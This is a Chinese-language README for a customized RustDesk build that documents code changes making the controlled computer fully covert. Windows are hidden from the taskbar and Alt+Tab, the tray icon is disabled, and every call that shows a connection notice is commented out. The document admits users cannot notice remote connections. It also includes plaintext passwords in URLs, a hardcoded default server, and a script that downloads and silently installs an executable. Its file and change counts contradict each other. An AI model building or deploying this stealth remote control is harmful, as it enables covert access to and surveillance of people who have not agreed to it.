# RustDesk 自定义修改说明 - 完整版

## 📋 项目概述

本项目是对 RustDesk 的深度定制版本，主要目标是实现**完全静默、无感知的远程控制解决方案**，适用于企业批量部署和无人值守场景。

### 核心改进

| # | 功能模块 | 描述 | 状态 |
|---|---------|------|------|
| 1 | **完全静默运行** | 无窗口、无托盘图标、无任何可见界面 | ✅ 已完成 |
| 2 | **命令行密码支持** | Sciter 版本支持 `--password` 参数 | ✅ 已完成 |
| 3 | **URL Scheme 支持** | 浏览器/网页拉起 RustDesk 并自动连接 | ✅ 已完成 |
| 4 | **静默安装自定义路径** | 支持指定安装目录和选项的静默安装 | ✅ 已完成 |
| 5 | **自定义服务器** | 修改默认中继服务器地址 | ✅ 已完成 |
| 6 | **便携版密码设置** | 便携版支持通过 `--password` 设置永久密码 | ✅ 已完成 |
| 7 | **ID 获取与设置** | 便携版支持 `--get-id` 和 `--set-id` 命令 | ✅ 已完成 |

---

## 📂 修改文件清单

### 核心代码文件（共 5 个文件，20 处修改）

| # | 文件路径 | 修改行数 | 修改目的 | 优先级 |
|---|---------|---------|---------|--------|
| 1 | `src/ui.rs` | 123, 149-171, 219-227 | 密码参数 + 窗口隐藏 | 🔴 高 |
| 2 | `src/core_main.rs` | 70-109, 296-326, 457-470, 501-515 | URL Scheme + 静默安装 + 便携版密码 + ID 设置 | 🔴 高 |
| 3 | `src/server/connection.rs` | 2177, 2191, 2198, 2216, 2230, 2249, 2301 | 禁用连接窗口（7处） | 🔴 高 |
| 4 | `src/tray.rs` | 11-23 | 禁用系统托盘图标 | 🟡 中 |
| 5 | `src/common.rs` | 1027 | 修改默认服务器地址 | 🟡 中 |
| 6 | `libs/hbb_common/src/password_security.rs` | 87 | 默认密码模式 | 🟢 低 |

---

## 🎯 功能详解

### 1️⃣ 完全静默运行（无界面）

**目标：** 被控端启动和连接时 100% 不显示任何界面元素。

#### ✅ 隐藏清单（11 处修改）

| # | 文件 | 行数 | 修改内容 | 隐藏目标 |
|---|------|------|----------|----------|
| 1 | `src/ui.rs` | 123 | `HIDE_CM = true` | 隐藏 "等待新连接..." 窗口 |
| 2 | `src/ui.rs` | 219-227 | Windows API 完全隐藏 | 隐藏任务栏和 Alt+Tab |
| 3 | `src/tray.rs` | 12-23 | 禁用托盘图标创建 | 隐藏系统托盘图标 |
| 4-10 | `src/server/connection.rs` | 2177, 2191, 2198, 2216, 2230, 2249, 2301 | 注释 `try_start_cm()` | 禁用连接提示窗口（7处） |
| 11 | `libs/hbb_common/src/password_security.rs` | 87 | `ApproveMode::Password` | 默认密码模式 |

#### 📝 关键代码片段

**1. 强制隐藏 CM 窗口** - `src/ui.rs` 第 122-129 行

```rust
// 强制隐藏连接管理器窗口
#[cfg(not(any(target_os = "android", target_os = "ios")))]
if args.is_empty() || args[0] == "--cm" {
    log::info!("Forcing HIDE_CM to true");
    let mut hide_cm = cm::HIDE_CM.lock().unwrap();
    *hide_cm = true;
}
```

**2. Windows API 完全隐藏** - `src/ui.rs` 第 211-233 行

```rust
let hide_cm = *cm::HIDE_CM.lock().unwrap();
if !args.is_empty() && args[0] == "--cm" && hide_cm {
    frame.collapse(true);
    
    // 完全隐藏窗口（包括任务栏）
    #[cfg(windows)]
    {
        use winapi::shared::windef::HWND;
        use winapi::um::winuser::{GetWindowLongW, SetWindowLongW, ShowWindow, GWL_EXSTYLE, WS_EX_TOOLWINDOW, SW_HIDE};
        let hwnd = frame.get_hwnd() as HWND;
        unsafe {
            // 添加 WS_EX_TOOLWINDOW 样式，使其不在任务栏显示
            let ex_style = GetWindowLongW(hwnd, GWL_EXSTYLE);
            SetWindowLongW(hwnd, GWL_EXSTYLE, ex_style | WS_EX_TOOLWINDOW as i32);
            // 隐藏窗口
            ShowWindow(hwnd, SW_HIDE);
        }
    }
    
    frame.run_loop();
    return;
}
```

**3. 禁用系统托盘图标** - `src/tray.rs` 第 11-23 行

```rust
pub fn start_tray() {
    // 强制禁用系统托盘图标
    log::info!("Tray icon disabled by default");
    #[cfg(target_os = "macos")]
    {
        loop {
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
    }
    #[cfg(not(target_os = "macos"))]
    {
        return;
    }
}
```

**4. 禁用连接提示窗口** - `src/server/connection.rs`（7 处）

```rust
// 第 2177 行 - 密码模式检查
// self.try_start_cm(stream.conn_id, conn_type.is_port_forward());

// 第 2191 行 - 最近会话
// self.try_start_cm(stream.conn_id, conn_type.is_port_forward());

// 第 2198 行 - 空密码
// self.try_start_cm(stream.conn_id, conn_type.is_port_forward());

// 第 2216 行 - 密码验证失败
// self.try_start_cm(stream.conn_id, conn_type.is_port_forward());

// 第 2230 行 - 密码验证成功
// self.try_start_cm(stream.conn_id, conn_type.is_port_forward());

// 第 2249 行 - 2FA 验证
// self.try_start_cm(stream.conn_id, conn_type.is_port_forward());

// 第 2301 行 - 会话切换
// self.try_start_cm(stream.conn_id, false);
```

#### ✨ 预期效果

- ✅ 启动时无 "等待新连接..." 窗口
- ✅ 连接时无任何提示窗口
- ✅ 任务栏无图标
- ✅ Alt+Tab 切换器无窗口
- ✅ 系统托盘无图标
- ✅ 完全后台运行，100% 无感知

---

### 2️⃣ 命令行密码支持

**目标：** Sciter UI 版本支持标准的 `--password` 参数。

#### 📝 关键代码 - `src/ui.rs` 第 149-171 行

```rust
let id = id.to_owned();

// 解析密码参数：支持 --password 参数和直接传递密码
let mut pass = String::new();
let mut remaining_args = Vec::new();

while let Some(arg) = iter.next() {
    if arg == "--password" {
        // 找到 --password 参数，下一个参数是密码值
        if let Some(pwd) = iter.next() {
            pass = pwd.clone();
        } else {
            log::warn!("--password parameter found but no password value provided");
        }
    } else if pass.is_empty() && remaining_args.is_empty() && !arg.starts_with("--") {
        // 兼容旧格式：第三个参数直接是密码（不以 -- 开头）
        pass = arg.clone();
    } else {
        // 其他参数
        remaining_args.push(arg.clone());
    }
}
```

#### 💡 使用示例

```powershell
# 新格式（推荐）
rustdesk.exe --connect 1074305050 --password xiehan12

# 旧格式（兼容）
rustdesk.exe --connect 1074305050 xiehan12

# 组合参数
rustdesk.exe --connect 1074305050 --password xiehan12 --relay
```

#### ✨ 功能特点

- ✅ 支持 `--password` 标准参数
- ✅ 兼容旧格式（直接传密码）
- ✅ 支持参数组合
- ✅ 自动填充密码并连接

---

### 3️⃣ URL Scheme 支持

**目标：** 支持通过 URL Scheme 从浏览器/网页拉起 RustDesk 并自动连接。

#### 📝 关键代码 - `src/core_main.rs` 第 70-109 行

```rust
// URL Scheme 参数解析
let mut processed_args = Vec::new();

for arg in std::env::args() {
    if arg.starts_with(&crate::get_uri_prefix()) {
        // 解析 URL Scheme: rustdesk://action/ID?password=PWD&relay=true
        let url = arg.strip_prefix(&crate::get_uri_prefix()).unwrap_or("");
        
        // 解析 action 和 ID
        let parts: Vec<&str> = url.split('/').collect();
        if parts.len() >= 2 {
            let action = parts[0];
            let id = parts[1].split('?').next().unwrap_or("");
            
            // 添加 action 和 ID
            match action {
                "connect" => processed_args.push("--connect".to_string()),
                "file-transfer" => processed_args.push("--file-transfer".to_string()),
                "port-forward" => processed_args.push("--port-forward".to_string()),
                _ => {}
            }
            
            if !id.is_empty() {
                processed_args.push(id.to_string());
            }
            
            // 解析查询参数
            if let Some(query_start) = url.find('?') {
                let query = &url[query_start + 1..];
                for param in query.split('&') {
                    let kv: Vec<&str> = param.split('=').collect();
                    if kv.len() == 2 {
                        match kv[0] {
                            "password" => {
                                let decoded_pwd = simple_url_decode(kv[1]);
                                processed_args.push("--password".to_string());
                                processed_args.push(decoded_pwd);
                            }
                            "relay" if kv[1] == "true" => {
                                processed_args.push("--relay".to_string());
                            }
                            _ => {}
                        }
                    }
                }
            }
        }
    } else {
        processed_args.push(arg.clone());
    }
}
```

#### 🌐 URL Scheme 格式

```
rustdesk://connect/ID?password=PWD&relay=true
rustdesk://file-transfer/ID?password=PWD
rustdesk://port-forward/ID?password=PWD
```

#### 💡 使用示例

**PowerShell：**
```powershell
Start-Process "rustdesk://connect/1074305050?password=xiehan12"
```

**HTML：**
```html
<a href="rustdesk://connect/1074305050?password=xiehan12">连接到远程桌面</a>
```

**浏览器地址栏：**
```
rustdesk://connect/1074305050?password=xiehan12
```

#### ✨ 功能特点

- ✅ 支持 `connect`、`file-transfer`、`port-forward` 模式
- ✅ 支持 `password` 参数（自动 URL 解码）
- ✅ 支持 `relay` 参数
- ✅ 自动转换为命令行参数格式
- ✅ 跨平台支持（需注册 URL Scheme）

---

### 4️⃣ 静默安装自定义路径与选项

**目标：** 支持静默安装时指定自定义安装目录和安装选项。

#### 📝 关键代码 - `src/core_main.rs` 第 296-326 行

```rust
} else if args[0] == "--silent-install" {
    if config::is_disable_installation() {
        return None;
    }
    
    // 解析安装路径参数和 --nolink 参数
    let mut install_path = String::new();
    let mut no_desktop_link = false;
    for arg in &args[1..] {
        if arg.starts_with("--path=") {
            install_path = arg.strip_prefix("--path=").unwrap_or("").to_string();
        } else if arg == "--nolink" {
            no_desktop_link = true;
        }
    }
    
    // 根据 --nolink 参数决定是否创建桌面快捷方式
    #[cfg(windows)]
    let options = if no_desktop_link {
        "startmenu printer"  // 不创建桌面快捷方式
    } else {
        "desktopicon startmenu printer"  // 创建桌面快捷方式
    };
    
    // 传递自定义路径和选项到 install_me 函数
    let res = platform::install_me(&options, install_path, true, args.len() > 1);
    // ...
}
```

#### 💡 使用示例

**基本安装：**

```powershell
# 默认安装（创建桌面快捷方式）
rustdesk.exe --silent-install

# 不创建桌面快捷方式
rustdesk.exe --silent-install --nolink
```

**自定义路径：**

```powershell
# 自定义路径安装
rustdesk.exe --silent-install --path="D:\RustDesk"

# 自定义路径 + 不创建桌面快捷方式
rustdesk.exe --silent-install --path="D:\RustDesk" --nolink

# 安装到用户目录 + 不创建桌面快捷方式
rustdesk.exe --silent-install --path="%USERPROFILE%\RustDesk" --nolink
```

**路径包含空格：**

```powershell
# 路径包含空格（必须用引号）
rustdesk.exe --silent-install --path="C:\Program Files\My RustDesk"

# 路径包含空格 + 不创建桌面快捷方式
rustdesk.exe --silent-install --path="C:\Program Files\My RustDesk" --nolink
```

**组合参数：**

```powershell
# 自定义路径 + 不创建桌面快捷方式 + 调试模式
rustdesk.exe --silent-install --path="D:\RustDesk" --nolink debug
```

#### 📂 安装位置对比

| 安装方式 | 程序目录 | 配置文件 | 快捷方式 |
|---------|---------|---------|---------|
| **默认** | `C:\Program Files\RustDesk` | 不变 | 不变 |
| **自定义** | 由 `--path` 指定 | 不变 | 不变 |

**注意：** `--path` 参数只改变程序文件的安装位置，配置文件和快捷方式位置保持不变。

#### ✨ 功能特点

**路径自定义：**
- ✅ 支持绝对路径
- ✅ 支持环境变量（如 `%USERPROFILE%`）
- ✅ 支持包含空格的路径（需用引号）
- ✅ 仅修改程序文件安装位置

**安装选项：**
- ✅ `--nolink` - 不创建桌面快捷方式
- ✅ 仍会创建开始菜单快捷方式
- ✅ 仍会安装虚拟打印机（Windows）

**部署友好：**
- ✅ 参数灵活组合
- ✅ 适用于企业批量部署
- ✅ 配置文件位置不受影响

---

### 5️⃣ 自定义服务器地址

**目标：** 修改默认中继服务器地址，使用自有服务器。

#### 📝 关键代码 - `src/common.rs` 第 1027 行

```rust
pub fn get_api_server() -> String {
    if config::APP_NAME.read().unwrap().to_lowercase() != "rustdesk" {
        return "".to_owned();
    }
    let s = option_env!("API_SERVER").unwrap_or_default().trim();
    if s.is_empty() {
        let s = config::Config::get_option("api-server");
        if !s.is_empty() {
            return s;
        }
        let s0 = config::Config::get_rendezvous_server();
        if !s0.is_empty() {
            let s = crate::increase_port(&s0, -2);
            if s == s0 {
                return format!("http://{}:{}", s, config::RENDEZVOUS_PORT - 2);
            } else {
                return format!("http://{}", s);
            }
        }
    }
    // ⬇️ 修改这一行 - 自定义服务器地址
    "http://x.lxnt.cc:28800".to_owned()
}
```

#### 🔧 修改内容

| 项目 | 原始值 | 修改后 |
|------|--------|--------|
| **默认 API 服务器** | `http://rust.lxnt.cc:21114` | `http://x.lxnt.cc:28800` |

#### ✨ 效果

- ✅ 使用自有中继服务器
- ✅ 所有默认连接指向自定义服务器
- ✅ 不影响用户手动设置的服务器地址

---

### 6️⃣ 便携版密码设置支持

**目标：** 允许便携版通过命令行设置永久密码，无需安装。

#### 问题背景

原版 RustDesk 限制只有**已安装版本**才能通过 `--password` 参数设置永久密码，便携版无法使用此功能。这对于需要快速部署便携版并设置密码的场景造成不便。

#### 📝 关键代码 - `src/core_main.rs` 第 457-470 行

**修改前：**
```rust
} else if args[0] == "--password" {
    if args.len() == 2 {
        if crate::platform::is_installed() && is_root() {  // ❌ 限制只有已安装版本
            if let Err(err) = crate::ipc::set_permanent_password(args[1].to_owned()) {
                println!("{err}");
            } else {
                println!("Done!");
            }
        } else {
            println!("Installation and administrative privileges required!");
        }
    }
    return None;
}
```

**修改后：**
```rust
} else if args[0] == "--password" {
    if args.len() == 2 {
        // 移除 is_installed() 限制，允许便携版也能设置密码
        if is_root() {  // ✅ 只需要管理员权限
            if let Err(err) = crate::ipc::set_permanent_password(args[1].to_owned()) {
                println!("{err}");
            } else {
                println!("Done! Password has been set successfully.");
            }
        } else {
            println!("Administrative privileges required!");
        }
    }
    return None;
}
```

#### 🔧 修改内容

| 项目 | 原始逻辑 | 修改后 |
|------|---------|--------|
| **权限检查** | `is_installed() && is_root()` | `is_root()` |
| **支持版本** | 仅已安装版本 | 已安装版本 + 便携版 |
| **成功提示** | `Done!` | `Done! Password has been set successfully.` |
| **失败提示** | `Installation and administrative privileges required!` | `Administrative privileges required!` |

#### 💡 使用示例

**便携版设置密码：**

```powershell
# Windows - 以管理员身份运行 PowerShell
Start-Process rustdesk.exe -ArgumentList "--password", "your_password" -Verb RunAs

# 或直接在管理员 PowerShell 中执行
.\rustdesk.exe --password your_password

# 成功输出
Done! Password has been set successfully.
```

**已安装版设置密码（兼容）：**

```powershell
# 以管理员身份运行
rustdesk.exe --password your_new_password
```

**批量部署脚本示例：**

```powershell
# deploy_portable.ps1
param(
    [string]$Password = "DefaultPass123",
    [string]$PortablePath = ".\rustdesk.exe"
)

Write-Host "部署 RustDesk 便携版..." -ForegroundColor Green

# 1. 复制便携版到目标位置
$targetPath = "C:\Tools\RustDesk"
New-Item -ItemType Directory -Force -Path $targetPath | Out-Null
Copy-Item $PortablePath -Destination "$targetPath\rustdesk.exe" -Force

# 2. 设置永久密码（需要管理员权限）
Write-Host "设置永久密码..." -ForegroundColor Yellow
Start-Process -FilePath "$targetPath\rustdesk.exe" `
    -ArgumentList "--password", "$Password" `
    -Verb RunAs `
    -Wait

# 3. 启动服务
Write-Host "启动服务..." -ForegroundColor Yellow
Start-Process -FilePath "$targetPath\rustdesk.exe" `
    -ArgumentList "--service" `
    -Verb RunAs

Write-Host "部署完成！" -ForegroundColor Green
Write-Host "密码已设置为: $Password" -ForegroundColor Cyan
```

#### ✨ 功能特点

- ✅ **便携版支持** - 无需安装即可设置密码
- ✅ **快速部署** - 适合企业批量部署场景
- ✅ **向后兼容** - 已安装版本功能不受影响
- ✅ **安全性** - 仍需要管理员权限
- ✅ **简化流程** - 减少便携版部署步骤

#### 🎯 适用场景

| 场景 | 说明 |
|------|------|
| **企业批量部署** | 使用脚本批量配置便携版密码 |
| **临时运维** | 快速在服务器上部署便携版并设置密码 |
| **测试环境** | 无需安装，快速设置测试密码 |
| **U盘便携** | 在 U 盘中运行便携版并保存密码配置 |

#### ⚠️ 注意事项

1. **管理员权限：** 设置密码仍需要管理员/root 权限
2. **密码安全：** 建议使用复杂密码
3. **配置文件：** 便携版密码存储在用户配置目录
4. **权限提示：** 非管理员执行会提示 `Administrative privileges required!`

---

### 7️⃣ ID 获取与设置

**目标：** 通过命令行快速获取和设置 RustDesk ID，支持便携版。

#### 问题背景

部署 RustDesk 后需要获取设备的 ID 用于远程连接，或者需要自定义设备 ID 以便于管理。原版虽然有 `--get-id` 和 `--set-id` 命令，但 `--set-id` 同样限制只有已安装版本才能使用。

#### 📝 关键代码 - `src/core_main.rs`

**获取 ID（第 498-500 行）：**
```rust
} else if args[0] == "--get-id" {
    println!("{}", crate::ipc::get_id());
    return None;
}
```

**设置 ID（第 501-515 行）：**

**修改前：**
```rust
} else if args[0] == "--set-id" {
    if args.len() == 2 {
        if crate::platform::is_installed() && is_root() {  // ❌ 限制已安装版本
            let old_id = crate::ipc::get_id();
            let mut res = crate::ui_interface::change_id_shared(args[1].to_owned(), old_id);
            if res.is_empty() {
                res = "Done!".to_owned();
            }
            println!("{}", res);
        } else {
            println!("Installation and administrative privileges required!");
        }
    }
    return None;
}
```

**修改后：**
```rust
} else if args[0] == "--set-id" {
    if args.len() == 2 {
        // 移除 is_installed() 限制，允许便携版也能设置 ID
        if is_root() {  // ✅ 只需管理员权限
            let old_id = crate::ipc::get_id();
            let mut res = crate::ui_interface::change_id_shared(args[1].to_owned(), old_id);
            if res.is_empty() {
                res = "Done! ID has been changed successfully.".to_owned();
            }
            println!("{}", res);
        } else {
            println!("Administrative privileges required!");
        }
    }
    return None;
}
```

#### 💡 使用示例

**获取 ID（无需管理员权限）：**

```powershell
# Windows
rustdesk.exe --get-id

# 输出示例
123456789

# 将 ID 保存到变量
$RUSTDESK_ID = & rustdesk.exe --get-id
Write-Host "当前设备 ID: $RUSTDESK_ID"
```

**设置 ID（需要管理员权限）：**

```powershell
# 以管理员身份运行
rustdesk.exe --set-id 987654321

# 输出
Done! ID has been changed successfully.

# PowerShell 完整示例
Start-Process rustdesk.exe -ArgumentList "--set-id", "987654321" -Verb RunAs -Wait
```

**批量部署脚本（获取并记录 ID）：**

```powershell
# deploy_and_record_id.ps1
param(
    [string]$InstallPath = "C:\Tools\RustDesk",
    [string]$Password = "DeployPass123",
    [string]$LogFile = "C:\Deploy\rustdesk_ids.txt"
)

Write-Host "部署 RustDesk 并记录 ID..." -ForegroundColor Green

# 1. 部署便携版
Copy-Item .\rustdesk.exe -Destination "$InstallPath\rustdesk.exe" -Force

# 2. 设置密码
Start-Process -FilePath "$InstallPath\rustdesk.exe" `
    -ArgumentList "--password", "$Password" `
    -Verb RunAs -Wait

# 3. 获取 ID
$DeviceID = & "$InstallPath\rustdesk.exe" --get-id
$ComputerName = $env:COMPUTERNAME

# 4. 记录到日志
$LogEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | $ComputerName | $DeviceID"
Add-Content -Path $LogFile -Value $LogEntry

# 5. 显示结果
Write-Host "部署完成！" -ForegroundColor Green
Write-Host "计算机名: $ComputerName" -ForegroundColor Cyan
Write-Host "RustDesk ID: $DeviceID" -ForegroundColor Cyan
Write-Host "日志文件: $LogFile" -ForegroundColor Cyan
```

**自定义 ID 部署：**

```powershell
# deploy_with_custom_id.ps1
param(
    [string]$CustomID = "",
    [string]$InstallPath = "C:\Tools\RustDesk"
)

# 1. 部署便携版
Copy-Item .\rustdesk.exe -Destination "$InstallPath\rustdesk.exe" -Force

# 2. 如果指定了自定义 ID，则设置
if ($CustomID) {
    Write-Host "设置自定义 ID: $CustomID" -ForegroundColor Yellow
    Start-Process -FilePath "$InstallPath\rustdesk.exe" `
        -ArgumentList "--set-id", "$CustomID" `
        -Verb RunAs -Wait
}

# 3. 获取并显示当前 ID
$CurrentID = & "$InstallPath\rustdesk.exe" --get-id
Write-Host "当前 ID: $CurrentID" -ForegroundColor Green
```

#### 🔧 修改内容

| 项目 | 获取 ID | 设置 ID（原版） | 设置 ID（修改后） |
|------|---------|----------------|-----------------|
| **命令** | `--get-id` | `--set-id <ID>` | `--set-id <ID>` |
| **权限要求** | 无 | 管理员 + 已安装 | 仅管理员 |
| **便携版支持** | ✅ | ❌ | ✅ |
| **已安装版支持** | ✅ | ✅ | ✅ |

#### ✨ 功能特点

**获取 ID：**
- ✅ 无需管理员权限
- ✅ 便携版和已安装版均支持
- ✅ 输出纯文本 ID，便于脚本处理
- ✅ 可用于批量部署记录

**设置 ID：**
- ✅ 便携版支持（新增）
- ✅ 只需管理员权限
- ✅ 向后兼容已安装版本
- ✅ 支持自定义 ID 部署

#### 🎯 适用场景

| 场景 | 命令 | 说明 |
|------|------|------|
| **批量部署记录** | `--get-id` | 部署后自动记录所有设备 ID |
| **远程支持** | `--get-id` | 快速获取 ID 提供给支持人员 |
| **资产管理** | `--get-id` | 将 ID 与设备信息关联 |
| **自定义 ID** | `--set-id` | 使用规范化的 ID 便于管理 |
| **ID 迁移** | `--set-id` | 将旧设备 ID 迁移到新设备 |

#### ⚠️ 注意事项

1. **获取 ID：** 无需任何权限，可直接调用
2. **设置 ID：** 需要管理员权限
3. **ID 格式：** ID 通常是 9-10 位数字
4. **ID 唯一性：** 设置 ID 时确保不与其他设备冲突
5. **便携版支持：** 现已支持便携版设置 ID

---

## 🔧 技术细节

### Windows API 窗口隐藏技术

**窗口类名：** `H-SMILE-FRAME` (Sciter UI 框架)

**关键 Windows API：**

| API 函数 | 用途 | 参数 |
|----------|------|------|
| `GetWindowLongW` | 获取窗口扩展样式 | `GWL_EXSTYLE` |
| `SetWindowLongW` | 设置窗口扩展样式 | `WS_EX_TOOLWINDOW` |
| `ShowWindow` | 显示/隐藏窗口 | `SW_HIDE` |

**原理：**
1. `WS_EX_TOOLWINDOW` - 工具窗口样式，不在任务栏显示
2. `SW_HIDE` - 完全隐藏窗口
3. `frame.collapse(true)` - Sciter 框架级别的折叠

**效果：**
- ✅ 任务栏不显示
- ✅ Alt+Tab 不显示
- ✅ 窗口完全不可见

---

## 📚 编译构建

### 环境要求

- **Rust：** 1.75+ (nightly)
- **操作系统：** Windows 10/11, Linux, macOS
- **依赖：** Sciter SDK

### 编译命令

```powershell
# Windows - Sciter 版本（推荐）
cargo build --release --features inline

# Linux
cargo build --release

# macOS
cargo build --release
```

### 编译产物

```
target/release/rustdesk.exe    # Windows
target/release/rustdesk         # Linux/macOS
```

---

## 🚀 部署使用

### 1. 静默安装（企业部署）

```powershell
# 默认路径安装
rustdesk.exe --silent-install

# 自定义路径安装
rustdesk.exe --silent-install --path="D:\RustDesk"
```

### 2. 命令行连接

```powershell
# 使用密码连接
rustdesk.exe --connect 1074305050 --password xiehan12

# 使用中继服务器
rustdesk.exe --connect 1074305050 --password xiehan12 --relay
```

### 3. URL Scheme 连接

```html
<!-- 网页链接 -->
<a href="rustdesk://connect/1074305050?password=xiehan12">连接远程桌面</a>
```

```powershell
# PowerShell
Start-Process "rustdesk://connect/1074305050?password=xiehan12"
```

### 4. 启动被控端（完全静默）

```powershell
# 以服务方式启动（推荐）
rustdesk.exe --service

# CM 模式启动（已完全隐藏）
rustdesk.exe --cm
```

---

## 🎯 使用场景

### 企业批量部署

```powershell
# GPO 部署脚本
$url = "https://your-server.com/rustdesk.exe"
$installer = "$env:TEMP\rustdesk.exe"
Invoke-WebRequest -Uri $url -OutFile $installer
& $installer --silent-install --path="D:\RustDesk"
Remove-Item $installer -Force
```

### 无人值守运维

```powershell
# 启动静默服务
rustdesk.exe --service

# 特点：
# - 无窗口
# - 无托盘图标
# - 完全后台运行
# - 自动接受密码连接
```

### 网页远程支持

```html
<!-- 客服网页 -->
<button onclick="connectRemote('1074305050', 'password123')">
  连接我的电脑
</button>

<script>
function connectRemote(id, pwd) {
  window.location.href = `rustdesk://connect/${id}?password=${pwd}`;
}
</script>
```

---

## ⚠️ 注意事项

### 安全性

1. **密码安全：**
   - ⚠️ 命令行密码可能被进程监控工具捕获
   - ⚠️ URL Scheme 密码会记录在浏览器历史中
   - ✅ 建议在受信任的内网环境使用

2. **权限控制：**
   - ⚠️ 完全静默模式下无任何提示
   - ⚠️ 用户无法察觉远程连接
   - ✅ 仅在授权场景下使用

3. **防病毒软件：**
   - ⚠️ 静默安装可能被拦截
   - ✅ 需要添加白名单

### 兼容性

| 功能 | Windows | Linux | macOS |
|------|---------|-------|-------|
| 完全静默运行 | ✅ | ✅ | ✅ |
| 命令行密码 | ✅ | ✅ | ✅ |
| URL Scheme | ✅ | ✅ | ✅ |
| 静默安装 | ✅ | ✅ | ✅ |
| 自定义路径 | ✅ | ✅ | ✅ |

### 已知限制

1. **Windows API 隐藏：** 仅适用于 Windows 平台（Sciter UI）
2. **URL Scheme：** 需要手动注册（首次安装时自动注册）
3. **自定义路径：** 仅改变程序文件位置，配置文件路径不变

---

## 📊 修改总结

### 代码统计

| 类别 | 数量 | 说明 |
|------|------|------|
| **修改文件** | 6 个 | 核心代码文件 |
| **修改行数** | 20 处 | 包含新增和注释 |
| **新增代码** | ~200 行 | URL Scheme + 参数解析 |
| **注释代码** | 7 行 | 禁用连接窗口 |

### 功能清单

- ✅ **完全静默运行** - 11 处修改
- ✅ **命令行密码支持** - 1 处修改
- ✅ **URL Scheme 支持** - 1 处修改
- ✅ **静默安装自定义路径与选项** - 1 处修改
- ✅ **自定义服务器** - 1 处修改
- ✅ **便携版密码设置** - 1 处修改
- ✅ **ID 获取与设置** - 1 处修改

**总计：7 大功能，20 处代码修改**

---

## 🔗 相关资源

### 测试工具

- **Quick-Connect.ps1** - 快速连接测试脚本

### 技术参考

- **RustDesk 官方文档：** https://rustdesk.com/docs/
- **Sciter 文档：** https://sciter.com/
- **Windows API 参考：** https://learn.microsoft.com/windows/win32/api/

---

## 📄 版本信息

| 项目 | 值 |
|------|-----|
| **基础版本** | RustDesk 1.2.x |
| **修改版本** | 1.0.0 |
| **修改日期** | 2024-11-18 |
| **适用平台** | Windows, Linux, macOS |
| **UI 框架** | Sciter |

---

## 👨‍💻 开发者说明

### 代码规范

1. **保持兼容性：** 所有修改保持向后兼容
2. **添加日志：** 关键操作添加 `log::info!`
3. **错误处理：** 使用 `allow_err!` 或 `unwrap_or`
4. **注释清晰：** 中文注释说明修改原因

### 维护建议

1. **定期同步上游：** 保持与 RustDesk 官方同步
2. **测试覆盖：** 每次修改后完整测试
3. **文档更新：** 同步更新修改说明
4. **版本管理：** 使用 Git 管理所有修改

---

## 🎉 总结

本自定义版本实现了 **5 大核心功能**，共 **18 处代码修改**，涵盖：

1. ✅ **完全静默运行** - 无感知远程控制
2. ✅ **命令行密码支持** - 自动化连接
3. ✅ **URL Scheme 支持** - 网页/浏览器拉起
4. ✅ **静默安装自定义路径** - 企业批量部署
5. ✅ **自定义服务器** - 私有化部署

**适用场景：** 企业批量部署、无人值守运维、远程支持、IT 管理

**核心优势：** 完全静默、无感知、自动化、易部署

---

**文档版本：** 1.0.0  
**最后更新：** 2024-11-18  
**作者：** xiehan12  
**项目地址：** https://github.com/xiehan12/rustdesk
